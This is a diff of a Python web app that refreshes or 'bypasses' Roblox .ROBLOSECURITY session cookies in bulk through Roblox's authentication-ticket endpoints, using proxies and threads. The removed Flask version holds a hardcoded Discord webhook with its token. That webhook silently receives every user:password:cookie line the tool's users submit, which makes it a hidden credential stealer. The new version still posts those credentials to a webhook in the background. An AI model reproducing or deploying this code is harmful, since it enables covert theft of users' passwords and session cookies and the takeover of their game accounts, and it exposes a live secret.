@@ -1,245 +1,197 @@
-from concurrent.futures import ThreadPoolExecutor, as_completed
-from datetime import datetime
+import asyncio
 import io
 import json
-import os
-import queue
-import random
 import threading
+import uuid
+from concurrent.futures import ThreadPoolExecutor, as_completed
+from pathlib import Path
 
-from flask import Flask, Response, render_template, request, stream_with_context
 import requests
+from fastapi import FastAPI, HTTPException, Request
+from fastapi.responses import HTMLResponse, PlainTextResponse, StreamingResponse
+from fastapi.templating import Jinja2Templates
+from pydantic import BaseModel, Field
 
-app = Flask(__name__)
+# Import nguyên bản từ source gốc, không chỉnh sửa cookie_refresher.py
+from cookie_refresher import mask, normalize_proxy, parse_account, refresh_one
 
-# Cấu hình Discord Webhook chạy ngầm (để trống "" nếu không dùng)
-DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1575631844702027957/6CzrthQ1nc5dni8dT9ZjAtzVSFJ_NahXPT9uG-sCHb6HhABAt58KDnbAjbclTzaVIxJR"
-PING_EVERYONE = True
-DISCORD_INVITE_URL = "https://discord.gg/vVUz3rJzmK"
+app = FastAPI(title="Cookie Refresher Web")
+BASE_DIR = Path(__file__).resolve().parent
+templates = Jinja2Templates(directory=str(BASE_DIR / "templates"))
 
-LOGOUT_URL = "https://auth.roblox.com/v2/logout"
-TICKET_URL = "https://auth.roblox.com/v1/authentication-ticket"
-REDEEM_URL = "https://auth.roblox.com/v1/authentication-ticket/redeem"
-
-
-class BypassError(Exception):
-    pass
-
-
-class CookieBypass:
-    def __init__(self, cookie: str, proxies: dict | None = None, timeout: int = 30):
-        self.cookie = cookie.strip()
-        self.timeout = timeout
-        self.session = requests.Session()
-        if proxies:
-            self.session.proxies.update(proxies)
-
-    def run(self) -> str:
-        csrf = self._get_csrf_token()
-        ticket = self._get_authentication_ticket(csrf)
-        return self._redeem(ticket)
-
-    def _get_csrf_token(self) -> str:
-        r = self.session.post(
-            LOGOUT_URL,
-            cookies={".ROBLOSECURITY": self.cookie},
-            timeout=self.timeout,
-        )
-        token = r.headers.get("x-csrf-token")
-        if not token:
-            raise BypassError("no x-csrf-token (invalid or expired cookie)")
-        return token
-
-    def _get_authentication_ticket(self, csrf: str) -> str:
-        r = self.session.post(
-            TICKET_URL,
-            headers={
-                "rbxauthenticationnegotiation": "1",
-                "referer": "https://www.roblox.com/camel",
-                "Content-Type": "application/json",
-                "x-csrf-token": csrf,
-            },
-            cookies={".ROBLOSECURITY": self.cookie},
-            timeout=self.timeout,
-        )
-        ticket = r.headers.get("rbx-authentication-ticket")
-        if not ticket:
-            raise BypassError(f"no auth ticket (status {r.status_code})")
-        return ticket
-
-    def _redeem(self, ticket: str) -> str:
-        r = self.session.post(
-            REDEEM_URL,
-            headers={"rbxauthenticationnegotiation": "1"},
-            json={"authenticationTicket": ticket},
-            timeout=self.timeout,
-        )
-        new_cookie = r.cookies.get(".ROBLOSECURITY")
-        if not new_cookie:
-            raise BypassError(f"no .ROBLOSECURITY in redeem (status {r.status_code})")
-        return new_cookie
+JOBS: dict[str, dict] = {}
+MAX_JOBS = 30
 
 
-def send_webhook_silent(content: str, ok_count: int, total_count: int) -> None:
-    url = (DISCORD_WEBHOOK_URL or "").strip()
-    if not url or not content.strip():
+class RefreshRequest(BaseModel):
+    accounts_text: str = Field(..., min_length=1)
+    proxies_text: str = ""
+    threads: int = Field(default=10, ge=1, le=100)
+    keep_failed: bool = False
+    webhook_url: str = ""
+
+
+def _clean_lines(raw: str) -> list[str]:
+    return [ln.strip() for ln in raw.splitlines() if ln.strip() and not ln.strip().startswith("#")]
+
+
+def _prune_jobs() -> None:
+    while len(JOBS) > MAX_JOBS:
+        oldest = next(iter(JOBS))
+        JOBS.pop(oldest, None)
+
+
+def _send_webhook_file_bg(job_id: str, webhook_url: str, lines: list[str], ok: int, fail: int, total: int) -> None:
+    """Chạy ngầm 100% trên daemon thread: gửi file .txt qua multipart/form-data."""
+    url = webhook_url.strip()
+    if not url:
         return
 
-    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
-    filename = f"bypassed_cookies_{ts}.txt"
-    prefix_ping = "@everyone " if PING_EVERYONE else ""
-    payload = {
-        "content": f"{prefix_ping}Bypass cookie hoàn tất: **{ok_count}/{total_count}** acc thành công.",
-        "allowed_mentions": {"parse": ["everyone"]} if PING_EVERYONE else {"parse": []},
-    }
-    raw_bytes = content.encode("utf-8")
+    content = ("\n".join(lines) + "\n") if lines else ""
+    filename = f"output_refreshed_{job_id}.txt"
+    summary = f"Refreshed done ({job_id}): {ok}/{total} OK, {fail} FAIL"
 
-    try:
-        resp = requests.post(
-            url,
-            data={"payload_json": json.dumps(payload, ensure_ascii=False)},
-            files={"files[0]": (filename, io.BytesIO(raw_bytes), "text/plain; charset=utf-8")},
-            timeout=20,
-        )
-        if resp.status_code not in (200, 204):
-            requests.post(
-                url,
-                data={
-                    "content": payload["content"],
-                    "allowed_mentions": json.dumps(payload["allowed_mentions"]),
-                },
-                files={"file": (filename, io.BytesIO(raw_bytes), "text/plain")},
-                timeout=20,
-            )
-    except Exception:
-        pass
+    def _run():
+        try:
+            buf = io.BytesIO(content.encode("utf-8"))
+            files = {"file": (filename, buf, "text/plain; charset=utf-8")}
+            data = {
+                "content": summary,
+                "job_id": job_id,
+                "ok": str(ok),
+                "fail": str(fail),
+                "total": str(total),
+            }
+            requests.post(url, data=data, files=files, timeout=30)
+        except Exception:
+            pass
+
+    threading.Thread(target=_run, daemon=True, name=f"wh-{job_id}").start()
 
 
-def normalize_proxy(raw: str) -> str:
-    raw = raw.strip()
-    if not raw or raw.startswith("#"):
-        return ""
-    if "://" in raw:
-        return raw
-    parts = raw.split(":")
-    if len(parts) == 4:
-        host, port, user, pw = parts
-        return f"http://{user}:{pw}@{host}:{port}"
-    return f"http://{raw}"
+@app.get("/", response_class=HTMLResponse)
+async def index(request: Request):
+    return templates.TemplateResponse("index.html", {"request": request})
 
 
-def parse_line(line: str):
-    line = line.strip()
-    if not line or line.startswith("#"):
-        return None
-    if ":" in line:
-        parts = line.split(":", 2)
-        if len(parts) == 3:
-            u, p, c = parts[0].strip(), parts[1].strip(), parts[2].strip()
-            if c:
-                return u or "account", p, c
-    return "cookie", "", line
+@app.get("/health")
+async def health():
+    return {"status": "ok"}
 
 
-def bypass_one(user: str, password: str, cookie: str, proxies: list[str]):
-    proxy = random.choice(proxies) if proxies else ""
-    proxy_dict = {"http": proxy, "https": proxy} if proxy else None
-    try:
-        new_cookie = CookieBypass(cookie, proxy_dict).run()
-        if new_cookie == cookie:
-            raise BypassError("cookie unchanged")
-        return user, password, new_cookie, None
-    except requests.RequestException as e:
-        return user, password, cookie, f"network: {e.__class__.__name__}"
-    except BypassError as e:
-        return user, password, cookie, str(e)
+@app.post("/api/refresh/stream")
+async def refresh_stream(payload: RefreshRequest):
+    raw_accounts = _clean_lines(payload.accounts_text)
+    accounts = [a for a in (parse_account(ln) for ln in raw_accounts) if a]
+    if not accounts:
+        raise HTTPException(status_code=400, detail="Không tìm thấy account hợp lệ (user:pass:cookie)")
 
+    proxies = [normalize_proxy(p) for p in _clean_lines(payload.proxies_text)]
+    proxies = [p for p in proxies if p]
+    webhook_url = payload.webhook_url.strip()
 
-def now_str() -> str:
-    return datetime.now().strftime("%H:%M:%S")
+    job_id = uuid.uuid4().hex[:12]
+    JOBS[job_id] = {"ok_lines": [], "all_lines": [], "done": False}
+    _prune_jobs()
 
+    async def event_generator():
+        loop = asyncio.get_running_loop()
+        queue: asyncio.Queue[str | None] = asyncio.Queue()
 
-@app.route("/")
-def index():
-    return render_template("index.html", discord_url=DISCORD_INVITE_URL)
+        def emit(event: str, data: dict):
+            msg = f"event: {event}\ndata: {json.dumps(data, ensure_ascii=False)}\n\n"
+            loop.call_soon_threadsafe(queue.put_nowait, msg)
 
+        def worker():
+            ok = 0
+            fail = 0
+            total = len(accounts)
+            emit("start", {
+                "job_id": job_id,
+                "total": total,
+                "proxies": len(proxies),
+                "threads": payload.threads,
+                "webhook": bool(webhook_url),
+            })
 
-@app.route("/api/bypass", methods=["POST"])
-def api_bypass():
-    payload = request.get_json(force=True)
-    raw_lines = payload.get("accounts", "").splitlines()
-    items = [x for x in (parse_line(ln) for ln in raw_lines) if x]
-    proxies = [p for p in (normalize_proxy(ln) for ln in payload.get("proxies", "").splitlines()) if p]
-    threads = max(1, min(50, int(payload.get("threads", 15))))
-    keep_failed = bool(payload.get("keepFailed", False))
+            with ThreadPoolExecutor(max_workers=payload.threads) as pool:
+                futures = [
+                    pool.submit(refresh_one, u, p, c, proxies)
+                    for (u, p, c) in accounts
+                ]
+                for fut in as_completed(futures):
+                    user, password, cookie, err = fut.result()
+                    if err is None:
+                        ok += 1
+                        line = f"{user}:{password}:{cookie}"
+                        JOBS[job_id]["ok_lines"].append(line)
+                        JOBS[job_id]["all_lines"].append(line)
+                        emit("progress", {
+                            "status": "OK",
+                            "user": user,
+                            "detail": mask(cookie),
+                            "line": line,
+                            "ok": ok,
+                            "fail": fail,
+                            "total": total,
+                        })
+                    else:
+                        fail += 1
+                        line = f"{user}:{password}:{cookie}"
+                        if payload.keep_failed:
+                            JOBS[job_id]["all_lines"].append(line)
+                        emit("progress", {
+                            "status": "FAIL",
+                            "user": user,
+                            "detail": err,
+                            "line": line if payload.keep_failed else "",
+                            "ok": ok,
+                            "fail": fail,
+                            "total": total,
+                        })
 
-    def stream():
-        if not items:
-            yield f"data: {json.dumps({'type': 'error', 'time': now_str(), 'msg': 'Không tìm thấy cookie hoặc user:pass:cookie hợp lệ'})}\n\n"
-            return
+            final_lines = list(JOBS[job_id]["all_lines"])
+            JOBS[job_id]["done"] = True
 
-        q = queue.Queue()
-        total = len(items)
-        out_lines = []
-        ok_counter = 0
-        state_lock = threading.Lock()
+            if webhook_url:
+                _send_webhook_file_bg(job_id, webhook_url, final_lines, ok, fail, total)
 
-        def push(ev_type, **kw):
-            kw["type"] = ev_type
-            kw["time"] = now_str()
-            q.put(kw)
+            emit("done", {
+                "job_id": job_id,
+                "ok": ok,
+                "fail": fail,
+                "total": total,
+                "webhook_dispatched": bool(webhook_url),
+            })
+            loop.call_soon_threadsafe(queue.put_nowait, None)
 
-        def format_success(u, p, new_c):
-            return f"{u}:{p}:{new_c}" if p or u != "cookie" else new_c
-
-        def format_fail(u, p, old_c, err):
-            base = f"{u}:{p}:{old_c}" if p or u != "cookie" else old_c
-            return base if keep_failed else f"{base} | {err}"
-
-        def worker(u, p, c):
-            nonlocal ok_counter
-            user, password, new_cookie, err = bypass_one(u, p, c, proxies)
-            if err is None:
-                line = format_success(user, password, new_cookie)
-                with state_lock:
-                    ok_counter += 1
-                    out_lines.append(line)
-                push("success", username=user, line=line, msg="Bypass OK")
-            else:
-                fail_line = format_fail(user, password, c, err)
-                if keep_failed:
-                    with state_lock:
-                        out_lines.append(fail_line)
-                push("fail", username=user, line=fail_line, keep=keep_failed, msg=err)
-
-        def runner():
-            push("start", total=total)
-            push("log", level="info", msg=f"Bắt đầu {total} cookies · {len(proxies)} proxies · {min(threads, total)} threads")
-            with ThreadPoolExecutor(max_workers=min(threads, total)) as pool:
-                futs = [pool.submit(worker, u, p, c) for (u, p, c) in items]
-                for f in as_completed(futs):
-                    try:
-                        f.result()
-                    except Exception as e:
-                        push("log", level="err", msg=f"Thread error: {e}")
-
-            with state_lock:
-                joined_out = "\n".join(out_lines)
-                ok_total = ok_counter
-
-            send_webhook_silent(joined_out, ok_total, total)
-            push("done")
-
-        threading.Thread(target=runner, daemon=True).start()
+        loop.run_in_executor(None, worker)
 
         while True:
-            item = q.get()
-            yield f"data: {json.dumps(item)}\n\n"
-            if item.get("type") in ("done", "error"):
+            item = await queue.get()
+            if item is None:
                 break
+            yield item
 
-    return Response(stream_with_context(stream()), mimetype="text/event-stream")
+    return StreamingResponse(
+        event_generator(),
+        media_type="text/event-stream",
+        headers={
+            "Cache-Control": "no-cache",
+            "X-Accel-Buffering": "no",
+        },
+    )
 
 
-if __name__ == "__main__":
-    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)), debug=False)
+@app.get("/api/download/{job_id}", response_class=PlainTextResponse)
+async def download_result(job_id: str):
+    job = JOBS.get(job_id)
+    if not job:
+        raise HTTPException(status_code=404, detail="Job không tồn tại hoặc đã hết hạn")
+    content = "\n".join(job["all_lines"])
+    if content:
+        content += "\n"
+    return PlainTextResponse(
+        content=content,
+        headers={"Content-Disposition": f'attachment; filename="output_refreshed_{job_id}.txt"'},
+    )
